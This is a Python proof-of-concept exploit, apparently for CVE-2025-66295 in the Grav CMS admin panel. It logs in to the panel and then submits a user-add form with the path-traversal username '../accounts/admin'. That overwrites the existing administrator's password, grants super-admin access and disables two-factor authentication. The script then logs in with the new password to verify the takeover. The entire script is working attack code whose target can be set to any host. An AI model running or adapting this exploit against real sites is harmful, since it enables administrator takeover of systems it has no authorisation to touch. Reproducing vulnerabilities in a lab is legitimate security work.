import argparse
import json
import re
import sys
import time

import requests


def new_session():
    s = requests.Session()
    s.headers.update(
        {
            "User-Agent": (
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
        }
    )
    return s


def extract_hidden_inputs(html):
    return dict(re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html))


def get_nonce(html, nonce_name):
    match = re.search(rf'name="{re.escape(nonce_name)}" value="([^"]+)"', html)
    return match.group(1) if match else None


def is_dashboard(html):
    markers = [
        "Dashboard | Grav",
        "admin-dashboard",
        "task=logout",
        "Logout",
    ]
    return any(m in html for m in markers)


def is_login_page(html):
    return "Grav Admin Login | Grav" in html or 'name="login-nonce"' in html


def is_register_page(html):
    return "Grav Register Admin User | Grav" in html or 'name="task" value="register"' in html


def has_rate_limit_error(html):
    return "Too many failed login attempted" in html


def get_admin_page(session, base_url, retries=24, interval=5):
    admin_url = f"{base_url}/admin"
    last_err = None
    for _ in range(retries):
        try:
            resp = session.get(admin_url, timeout=10)
            if resp.status_code == 200 and "<title>" in resp.text:
                return resp
            last_err = f"unexpected status {resp.status_code}"
        except requests.RequestException as e:
            last_err = str(e)
        time.sleep(interval)
    raise RuntimeError(f"admin page not ready: {last_err}")


def register_admin_if_needed(session, base_url, username, password, email, fullname):
    resp = get_admin_page(session, base_url)
    if not is_register_page(resp.text):
        return True

    print("[*] First-time setup detected, creating admin user...")
    nonce = get_nonce(resp.text, "login-nonce")
    if not nonce:
        print("[-] Missing register nonce")
        return False

    hidden = extract_hidden_inputs(resp.text)
    data = {
        "data[username]": username,
        "data[email]": email,
        "data[password1]": password,
        "data[password2]": password,
        "data[fullname]": fullname,
        "data[title]": "Administrator",
        "task": "register",
        "login-nonce": nonce,
        "__form-name__": hidden.get("__form-name__", "admin-login-register"),
        "__unique_form_id__": hidden.get("__unique_form_id__", "admin-login-register"),
    }

    post = session.post(f"{base_url}/admin", data=data, allow_redirects=False, timeout=10)
    if post.status_code not in (200, 303):
        print(f"[-] Register request failed, status={post.status_code}")
        return False

    # Require that register phase exits the register page.
    check = session.get(f"{base_url}/admin", timeout=10)
    if is_register_page(check.text):
        print("[-] Register did not complete (still on register page).")
        return False

    print("[+] Admin user created")
    return True


def strict_login(session, base_url, username, password):
    print(f"[*] Logging in as {username}...")
    resp = get_admin_page(session, base_url)
    if has_rate_limit_error(resp.text):
        print("[-] Login blocked by rate limit. Wait ~10 minutes or reset volume.")
        return False
    if is_dashboard(resp.text):
        print("[+] Already authenticated")
        return True

    nonce = get_nonce(resp.text, "login-nonce")
    if not nonce:
        print("[-] Missing login nonce")
        return False

    hidden = extract_hidden_inputs(resp.text)
    data = {
        "data[username]": username,
        "data[password]": password,
        "task": "login",
        "login-nonce": nonce,
    }
    for k, v in hidden.items():
        if k not in data and k != "login-nonce":
            data[k] = v

    post = session.post(f"{base_url}/admin", data=data, allow_redirects=False, timeout=10)
    if post.status_code not in (200, 303):
        print(f"[-] Login request failed, status={post.status_code}")
        return False

    # Validate authenticated state strictly by loading /admin and requiring dashboard markers.
    check = session.get(f"{base_url}/admin", timeout=10)
    if is_dashboard(check.text):
        print("[+] Login successful")
        return True

    if has_rate_limit_error(check.text):
        print("[-] Login failed and triggered rate limit.")
    else:
        print("[-] Login failed (dashboard markers not found).")
    return False


def exploit(session, base_url, new_pass):
    print("[*] Attempting exploit (overwrite admin)...")
    resp = session.get(f"{base_url}/admin/accounts/users/:add", timeout=10)
    if resp.status_code != 200:
        print(f"[-] Failed to open add-user page, status={resp.status_code}")
        return False

    nonce = get_nonce(resp.text, "form-nonce")
    if not nonce:
        print("[-] Missing form nonce")
        return False

    unique_id = extract_hidden_inputs(resp.text).get("__unique_form_id__")
    data = {
        "task": "save",
        "data[username]": "../accounts/admin",
        "data[email]": "admin@example.com",
        "data[password]": new_pass,
        "data[fullname]": "Hacked Admin",
        "data[title]": "Hacked Administrator",
        "data[level]": "admin",
        "data[twofa_enabled]": "0",
        "data[access][site.login]": "1",
        "data[access][admin.login]": "1",
        "data[access][admin.super]": "1",
        "form-nonce": nonce,
        "__form-name__": "flex-user_accounts",
    }
    if unique_id:
        data["__unique_form_id__"] = unique_id

    post = session.post(f"{base_url}/admin/accounts/users/:add", data=data, allow_redirects=False, timeout=10)
    print(f"[*] Exploit request status: {post.status_code}")
    if post.status_code in (401, 403):
        print("[-] Exploit blocked by authorization/CSRF.")
        return False
    if post.status_code not in (200, 303):
        print("[-] Exploit request returned unexpected status.")
        return False
    return True


def verify(base_url, admin_user, new_pass):
    print("[*] Verifying with strict login using new password...")
    verify_session = new_session()
    if strict_login(verify_session, base_url, admin_user, new_pass):
        print("[+] Exploit SUCCESS: new password works for admin.")
        return True
    print("[-] Verification failed: cannot login with new password.")
    return False


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-66295 strict PoC")
    parser.add_argument("--target", default="http://127.0.0.1:8088")
    parser.add_argument("--admin-user", default="admin")
    parser.add_argument("--admin-pass", default="Password1")
    parser.add_argument("--admin-email", default="admin@example.com")
    parser.add_argument("--admin-fullname", default="Admin User")
    parser.add_argument("--new-pass", default="Hacked123!")
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    session = new_session()

    try:
        if not register_admin_if_needed(
            session,
            base_url,
            args.admin_user,
            args.admin_pass,
            args.admin_email,
            args.admin_fullname,
        ):
            return 1
    except RuntimeError as e:
        print(f"[-] {e}")
        return 1

    if not strict_login(session, base_url, args.admin_user, args.admin_pass):
        return 1
    if not exploit(session, base_url, args.new_pass):
        return 1
    if not verify(base_url, args.admin_user, args.new_pass):
        return 1

    print("[+] Vulnerability reproduced successfully (strict mode).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
